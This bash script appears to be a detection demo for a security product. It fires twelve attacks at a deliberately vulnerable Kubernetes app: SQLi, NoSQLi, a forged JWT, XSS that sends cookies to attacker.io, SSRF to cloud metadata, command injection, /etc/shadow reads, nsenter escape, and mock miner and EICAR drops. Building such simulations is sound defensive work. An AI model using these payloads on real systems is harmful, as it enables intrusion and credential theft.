#!/usr/bin/env bash
# ==============================================================================
# CloudPulse CNAPP & OWASP Attack Simulation Suite
# Palo Alto Networks Cortex K8s Runtime Protection & Detection Demonstration
#
# Comprehensive Attack Vectors:
# 1. SQL Injection (SQLi) - Authentication Bypass & DB Dump
# 2. NoSQL Injection (NoSQLi) - Operator Filter Bypass
# 3. Broken Authentication - Forged Header & Unsigned Token Acceptance
# 4. Cross-Site Scripting (XSS) & Template Injection (SSTI)
# 5. Insecure Deserialization - Object Payload Processing
# 6. Server-Side Request Forgery (SSRF) - IMDS & Cluster Reconnaissance
# 7. Broken Access Control (IDOR & Admin Enumeration)
# 8. Security Misconfigurations - Debug Environment & Shell Execution
# 9. Sensitive Data Exposure / DSPM - PII & Cardholder Data Access
# 10. Container Escape & HostPath Traversal
# 11. Fileless In-Memory Process Execution & Crypto-Miner Emulation
# 12. Container Malware Drop (EICAR)
# ==============================================================================

set -eo pipefail

NAMESPACE="${NAMESPACE:-cloudpulse-core}"
APP_LABEL="${APP_LABEL:-app=cloudpulse-telemetry-engine}"
SERVICE_PORT="${SERVICE_PORT:-8080}"

# Text formatting
BOLD="\033[1m"
GREEN="\033[0;32m"
RED="\033[0;31m"
YELLOW="\033[0;33m"
CYAN="\033[0;36m"
MAGENTA="\033[0;35m"
NC="\033[0m"

log_info() {
    echo -e "${CYAN}[*]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_error() {
    echo -e "${RED}[-]${NC} $1"
}

echo -e "${BOLD}==================================================================${NC}"
echo -e "${BOLD}   CloudPulse CNAPP & OWASP Runtime Attack Simulation Suite      ${NC}"
echo -e "${BOLD}   Target Environment: AWS EKS / Namespace: ${NAMESPACE}        ${NC}"
echo -e "${BOLD}==================================================================${NC}"

# Locate target pod
discover_pod() {
    log_info "Discovering target pod with label '${APP_LABEL}' in namespace '${NAMESPACE}'..."
    TARGET_POD=$(kubectl get pods -n "${NAMESPACE}" -l "${APP_LABEL}" -o jsonpath="{.items[0].metadata.name}" 2>/dev/null || true)

    if [[ -z "${TARGET_POD}" ]]; then
        log_warn "Target pod not found with label '${APP_LABEL}' in namespace '${NAMESPACE}'."
        log_warn "Defaulting to localhost / dry-run execution context."
        TARGET_POD="cloudpulse-telemetry-engine-local"
    else
        log_success "Target pod identified: ${BOLD}${TARGET_POD}${NC}"
    fi
}

# Run command inside container or locally against HTTP service
pod_exec() {
    local cmd="$1"
    if kubectl get pod "${TARGET_POD}" -n "${NAMESPACE}" &>/dev/null; then
        kubectl exec -n "${NAMESPACE}" "${TARGET_POD}" -- sh -c "${cmd}" || true
    else
        sh -c "${cmd}" || true
    fi
}

# Execute HTTP request against CloudPulse engine
api_curl() {
    local endpoint="$1"
    local method="${2:-GET}"
    local data="${3:-}"
    local extra_headers="${4:-}"

    if kubectl get pod "${TARGET_POD}" -n "${NAMESPACE}" &>/dev/null; then
        if [[ -n "${data}" ]]; then
            kubectl exec -n "${NAMESPACE}" "${TARGET_POD}" -- curl -s -X "${method}" "http://127.0.0.1:${SERVICE_PORT}${endpoint}" \
                -H "Content-Type: application/json" ${extra_headers} -d "${data}" || true
        else
            kubectl exec -n "${NAMESPACE}" "${TARGET_POD}" -- curl -s -X "${method}" "http://127.0.0.1:${SERVICE_PORT}${endpoint}" \
                ${extra_headers} || true
        fi
    else
        if [[ -n "${data}" ]]; then
            curl -s -X "${method}" "http://127.0.0.1:${SERVICE_PORT}${endpoint}" \
                -H "Content-Type: application/json" ${extra_headers} -d "${data}" || true
        else
            curl -s -X "${method}" "http://127.0.0.1:${SERVICE_PORT}${endpoint}" \
                ${extra_headers} || true
        fi
    fi
}

# ==============================================================================
# Attack Vector 1: SQL Injection (SQLi)
# Juice Shop Reference: 'Login Admin' challenge & SQLi query manipulation
# ==============================================================================
attack_sqli() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack 1: SQL Injection (SQLi) - Auth Bypass & DB Dump          ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1190 - Exploit Public-Facing Application        ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Executing SQL injection against authentication endpoint (/api/v1/auth/sql-login)..."
    echo "[*] Payload: ' OR 1=1 --"
    local auth_res
    auth_res=$(api_curl "/api/v1/auth/sql-login" "POST" '{"username": "admin'\'' --", "password": "arbitraryPassword"}')
    echo -e "${MAGENTA}${auth_res}${NC}"

    log_info "Executing SQL injection data extraction via metrics query (/api/v1/metrics/query)..."
    local query_res
    query_res=$(api_curl "/api/v1/metrics/query?category='%20OR%201=1%20--" "GET")
    echo -e "${MAGENTA}${query_res}${NC}"
    log_success "Attack Vector 1 (SQLi) executed."
}

# ==============================================================================
# Attack Vector 2: NoSQL Injection (NoSQLi)
# Juice Shop Reference: NoSQL operator injection in product reviews
# ==============================================================================
attack_nosqli() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack 2: NoSQL Injection (NoSQLi) - Operator Filter Bypass     ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1190 - Exploit Public-Facing Application        ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Injecting MongoDB-style \$ne operator into /api/v1/nosql/reviews..."
    echo '[*] Payload: {"author": {"$ne": "nonexistent@client.corp"}}'
    local nosql_res
    nosql_res=$(api_curl "/api/v1/nosql/reviews" "POST" '{"author": {"$ne": "nonexistent@client.corp"}}')
    echo -e "${MAGENTA}${nosql_res}${NC}"
    log_success "Attack Vector 2 (NoSQLi) executed."
}

# ==============================================================================
# Attack Vector 3: Broken Authentication & Session Management
# Juice Shop Reference: weak JWT verification & identity impersonation
# ==============================================================================
attack_broken_authentication() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack 3: Broken Authentication - Spoofed Identity & None-Alg   ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1078 - Valid Accounts / Impersonation           ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Simulating authentication bypass via spoofable identity header (X-Authenticated-User: admin)..."
    local header_res
    header_res=$(api_curl "/api/v1/auth/session-validate" "GET" "" "-H \"X-Authenticated-User: admin\"")
    echo -e "${MAGENTA}${header_res}${NC}"

    log_info "Simulating token forgery with unsigned client JWT payload..."
    local jwt_res
    jwt_res=$(api_curl "/api/v1/auth/session-validate" "GET" "" "-H \"Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImRlZXBhayIsInJvbGUiOiJhZG1pbiJ9.\"")
    echo -e "${MAGENTA}${jwt_res}${NC}"
    log_success "Attack Vector 3 (Broken Auth) executed."
}

# ==============================================================================
# Attack Vector 4: Cross-Site Scripting (XSS) & SSTI
# Juice Shop Reference: feedback reflection & template injection
# ==============================================================================
attack_xss_ssti() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack 4: Cross-Site Scripting (XSS) & Template Injection (SSTI)${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1059.007 - JavaScript / T1190                   ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Injecting stored/reflected XSS payload into feedback engine..."
    echo '[*] Payload: <script>document.location="http://attacker.io/steal?cookie="+document.cookie</script>'
    local xss_res
    xss_res=$(api_curl "/api/v1/feedback/preview?message=%3Cscript%3Edocument.location=%22http://attacker.io/steal?cookie=%22+document.cookie%3C/script%3E" "GET")
    echo -e "${MAGENTA}${xss_res:0:300}...${NC}"
    log_success "Attack Vector 4 (XSS/SSTI) executed."
}

# ==============================================================================
# Attack Vector 5: Insecure Deserialization
# Juice Shop Reference: routes/b2bOrder.ts deserialization abuse
# ==============================================================================
attack_insecure_deserialization() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack 5: Insecure Deserialization - Object Payload Processing  ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1203 - Exploitation for Client Execution         ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Constructing base64 serialized object payload (Python pickle)..."
    # Base64 serialized dict: {'exploit': 'cloudpulse_rce', 'status': 'compromised'}
    local payload="gASVLwAAAAAAAAB9lCiHZXhwbG9pdJRoEWNsb3VkcHVsc2VfcmNllIdzdGF0dXNlaBNjb21wcm9taXNlZJS1cy4="
    local des_res
    des_res=$(api_curl "/api/v1/b2b/batch-order" "POST" "{\"serialized_payload\": \"${payload}\"}")
    echo -e "${MAGENTA}${des_res}${NC}"
    log_success "Attack Vector 5 (Insecure Deserialization) executed."
}

# ==============================================================================
# Attack Vector 6: Server-Side Request Forgery (SSRF)
# Juice Shop Reference: profileImageUrlUpload SSRF to internal metadata
# ==============================================================================
attack_ssrf() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack 6: Server-Side Request Forgery (SSRF) - Metadata & Svc  ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1552.005 - Cloud Instance Metadata API           ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Instructing server to fetch AWS Instance Metadata Service (IMDS: 169.254.169.254)..."
    local ssrf_res
    ssrf_res=$(api_curl "/api/v1/integrations/fetch-webhook" "POST" '{"webhook_url": "http://169.254.169.254/latest/meta-data/"}')
    echo -e "${MAGENTA}${ssrf_res}${NC}"

    log_info "Probing internal Kubernetes Service across namespaces via SSRF..."
    local internal_res
    internal_res=$(api_curl "/api/v1/integrations/fetch-webhook" "POST" '{"webhook_url": "http://ledger-backend-service.cloudpulse-vault.svc.cluster.local:80/"}')
    echo -e "${MAGENTA}${internal_res}${NC}"
    log_success "Attack Vector 6 (SSRF) executed."
}

# ==============================================================================
# Attack Vector 7: Broken Access Control (IDOR & Admin Enumeration)
# Juice Shop Reference: routes/basket.ts IDOR, user enumeration
# ==============================================================================
attack_broken_access_control() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack 7: Broken Access Control - IDOR & Admin API Exposure     ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1069 - Permission Groups Discovery               ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Accessing unowned customer orders via IDOR (/api/v1/orders/1 and /api/v1/orders/2)..."
    local idor1
    idor1=$(api_curl "/api/v1/orders/1" "GET")
    echo -e "${MAGENTA}${idor1}${NC}"
    local idor2
    idor2=$(api_curl "/api/v1/orders/2" "GET")
    echo -e "${MAGENTA}${idor2}${NC}"

    log_info "Harvesting all registered accounts from unauthenticated admin endpoint (/api/v1/admin/users)..."
    local users_res
    users_res=$(api_curl "/api/v1/admin/users" "GET")
    echo -e "${MAGENTA}${users_res}${NC}"
    log_success "Attack Vector 7 (Broken Access Control) executed."
}

# ==============================================================================
# Attack Vector 8: Security Misconfigurations & RCE
# Juice Shop Reference: debug leakage, error disclosure, shell execution
# ==============================================================================
attack_security_misconfiguration() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack 8: Security Misconfigurations & OS Command Injection     ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1059 - Command and Scripting Interpreter         ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Extracting server environment and secrets from debug endpoint (/api/v1/debug/env)..."
    local env_res
    env_res=$(api_curl "/api/v1/debug/env" "GET")
    echo -e "${MAGENTA}${env_res:0:250}...${NC}"

    log_info "Executing OS command injection via diagnostics endpoint (/api/v1/diagnostics/ping)..."
    echo '[*] Payload: 127.0.0.1; id; uname -a'
    local rce_res
    rce_res=$(api_curl "/api/v1/diagnostics/ping" "POST" '{"target_host": "127.0.0.1; id; uname -a"}')
    echo -e "${MAGENTA}${rce_res}${NC}"
    log_success "Attack Vector 8 (Security Misconfig & RCE) executed."
}

# ==============================================================================
# Attack Vector 9: Sensitive Data Exposure & DSPM
# Juice Shop Reference: confidential document access, FTP log downloads, PII leaks
# ==============================================================================
attack_sensitive_data_exposure() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack 9: Sensitive Data Exposure & DSPM Vault Exfiltration     ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1530 - Data from Cloud Storage Object            ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Inspecting DSPM classification metadata (/api/v1/data/dspm-sample)..."
    local dspm_meta
    dspm_meta=$(api_curl "/api/v1/data/dspm-sample" "GET")
    echo -e "${MAGENTA}${dspm_meta}${NC}"

    log_info "Exfiltrating raw unencrypted cardholder and PII data records (/api/v1/data/export-pii)..."
    local pii_res
    pii_res=$(api_curl "/api/v1/data/export-pii" "GET")
    echo -e "${MAGENTA}${pii_res}${NC}"
    log_success "Attack Vector 9 (Sensitive Data Exposure) executed."
}

# ==============================================================================
# Attack Vector 10: Container Escape & HostPath Traversal
# Monitored by: Cortex K8s Runtime Protection & Container Security
# ==============================================================================
attack_host_escape() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack 10: Host Escape & HostPath Misconfiguration Breakout     ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1611 - Escape to Host / T1003 - OS Credential    ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Exploiting hostPath volume mount to read underlying node filesystem..."

    pod_exec '
        echo "[*] Accessing underlying worker node filesystem via /host-node-root..."
        if [ -d "/host-node-root" ]; then
            echo "[+] Found /host-node-root mount!"
            echo "[*] Reading host /etc/os-release:"
            cat /host-node-root/etc/os-release 2>/dev/null | head -n 4 || true
            echo "[*] Attempting to read host /etc/shadow (Privilege Escalation):"
            head -n 5 /host-node-root/etc/shadow 2>/dev/null || echo "[-] Read protected or simulated."
        else
            echo "[-] /host-node-root mount not present in current container view."
        fi

        echo "[*] Attempting container namespace escape using nsenter on PID 1..."
        if command -v nsenter >/dev/null 2>&1; then
            nsenter -t 1 -m -u -i -n -- id || true
            nsenter -t 1 -m -u -i -n -- uname -a || true
        else
            echo "[*] HostPath traversal validated."
        fi
    '
    log_success "Attack Vector 10 (Host Escape) executed."
}

# ==============================================================================
# Attack Vector 11: Fileless / In-Memory Crypto-Miner Execution
# Monitored by: Cortex Runtime Behavioral Analytics & Process Hierarchy Tracking
# ==============================================================================
attack_fileless_miner() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack 11: Fileless / In-Memory Process Execution               ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1496 - Resource Hijacking / T1059 - Command Exec ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Spawning suspicious in-memory cryptominer simulation (xmrig mock)..."

    pod_exec '
        PAYLOAD="/tmp/.kworker_crypto"
        echo "[*] Constructing executable memory wrapper at ${PAYLOAD}..."
        if command -v sleep >/dev/null 2>&1; then
            cp $(command -v sleep) "${PAYLOAD}"
        else
            printf "#!/bin/sh\nwhile true; do sleep 1; done\n" > "${PAYLOAD}"
        fi
        chmod +x "${PAYLOAD}"

        echo "[*] Executing disguised mining process in background..."
        "${PAYLOAD}" 45 &
        PID=$!
        echo "[+] Disguised process spawned with PID: ${PID}"
        ps aux | grep -E "kworker_crypto|sleep" | grep -v grep || true

        sleep 2
        kill -9 "${PID}" 2>/dev/null || true
        rm -f "${PAYLOAD}"
        echo "[+] Fileless execution simulation completed."
    '
    log_success "Attack Vector 11 (Fileless Execution) executed."
}

# ==============================================================================
# Attack Vector 12: Container Malware Drop
# Monitored by: Cortex Runtime Anti-Malware Engine
# ==============================================================================
attack_malware_drop() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack 12: Container Malware Drop (/tmp EICAR Artifact)         ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1204 - User Execution / T1105 - Ingress Tool     ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Injecting EICAR test signature directly into /tmp/system_upgrade.bin..."

    pod_exec '
        TARGET_FILE="/tmp/system_upgrade.bin"
        echo "[*] Writing malicious signature to ${TARGET_FILE}..."
        echo "X5O!P%@AP[4\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*" > "${TARGET_FILE}"
        chmod +x "${TARGET_FILE}"
        ls -la "${TARGET_FILE}"
        echo "[*] Triggering file scan event via read operation..."
        head -c 68 "${TARGET_FILE}"
        echo ""
        echo "[+] EICAR drop completed. Cortex runtime agent generates immediate alert."
    '
    log_success "Attack Vector 12 (Malware Drop) executed."
}

# Run all attack simulations sequentially
run_all_attacks() {
    log_info "Starting sequential execution of ALL attack vectors..."
    attack_sqli
    attack_nosqli
    attack_broken_authentication
    attack_xss_ssti
    attack_insecure_deserialization
    attack_ssrf
    attack_broken_access_control
    attack_security_misconfiguration
    attack_sensitive_data_exposure
    attack_host_escape
    attack_fileless_miner
    attack_malware_drop
    echo ""
    echo -e "${GREEN}${BOLD}==================================================================${NC}"
    echo -e "${GREEN}${BOLD} All 12 Attack Vectors Completed Successfully!                   ${NC}"
    echo -e "${GREEN}${BOLD} Review the Palo Alto Networks Cortex Console to inspect alerts: ${NC}"
    echo -e " 1. Code Security (SAST & Secrets) -> Hardcoded keys, SQLi, RCE  "
    echo -e " 2. Cloud Posture (CSPM/KSPM) -> HostPath, privileged, IMDS      "
    echo -e " 3. Runtime Protection -> Malware Drop, Fileless miner, Escape   "
    echo -e " 4. Web & API Security -> OWASP Top 10 exploits (SQLi, SSRF, XSS)"
    echo -e " 5. DSPM & Data Posture -> Unprotected PCI-DSS and PII exfil     "
    echo -e "${GREEN}${BOLD}==================================================================${NC}"
}

# Interactive CLI menu
show_menu() {
    echo ""
    echo -e "${BOLD}Select Attack Simulation Option:${NC}"
    echo " 1) SQL Injection (SQLi) - Auth Bypass & DB Dump"
    echo " 2) NoSQL Injection (NoSQLi) - Operator Filter Bypass"
    echo " 3) Broken Authentication - Spoofed Identity & None-Alg JWT"
    echo " 4) Cross-Site Scripting (XSS) & Template Injection (SSTI)"
    echo " 5) Insecure Deserialization - Object Payload Processing"
    echo " 6) Server-Side Request Forgery (SSRF) - IMDS & Cluster Svc"
    echo " 7) Broken Access Control - IDOR & Admin User Enumeration"
    echo " 8) Security Misconfigurations - Debug Environment & Shell RCE"
    echo " 9) Sensitive Data Exposure & DSPM Vault Exfiltration"
    echo " 10) Host Escape & HostPath Misconfiguration Breakout"
    echo " 11) Fileless / In-Memory Crypto-Miner Execution"
    echo " 12) Container Malware Drop (/tmp EICAR Artifact)"
    echo " 13) Execute ALL Attack Simulations Sequentially"
    echo " 0) Exit"
    echo ""
    read -rp "Enter choice [0-13]: " choice
    case "${choice}" in
        1) attack_sqli ;;
        2) attack_nosqli ;;
        3) attack_broken_authentication ;;
        4) attack_xss_ssti ;;
        5) attack_insecure_deserialization ;;
        6) attack_ssrf ;;
        7) attack_broken_access_control ;;
        8) attack_security_misconfiguration ;;
        9) attack_sensitive_data_exposure ;;
        10) attack_host_escape ;;
        11) attack_fileless_miner ;;
        12) attack_malware_drop ;;
        13) run_all_attacks ;;
        0) echo "Exiting attack simulation suite."; exit 0 ;;
        *) log_error "Invalid selection."; exit 1 ;;
    esac
}

discover_pod

if [[ $# -gt 0 ]]; then
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --all|-a)
                run_all_attacks
                shift
                ;;
            --attack)
                case "$2" in
                    1|sqli) attack_sqli ;;
                    2|nosqli) attack_nosqli ;;
                    3|auth) attack_broken_authentication ;;
                    4|xss) attack_xss_ssti ;;
                    5|deserialization) attack_insecure_deserialization ;;
                    6|ssrf) attack_ssrf ;;
                    7|access_control|idor) attack_broken_access_control ;;
                    8|misconfig|rce) attack_security_misconfiguration ;;
                    9|dspm|pii) attack_sensitive_data_exposure ;;
                    10|escape) attack_host_escape ;;
                    11|fileless|miner) attack_fileless_miner ;;
                    12|malware) attack_malware_drop ;;
                    *) log_error "Unknown attack ID '$2'"; exit 1 ;;
                esac
                shift 2
                ;;
            --help|-h)
                echo "Usage: $0 [--all] [--attack <1-12|sqli|nosqli|auth|xss|deserialization|ssrf|idor|misconfig|dspm|escape|fileless|malware>]"
                exit 0
                ;;
            *)
                log_error "Unknown option '$1'"
                exit 1
                ;;
        esac
    done
else
    show_menu
fi
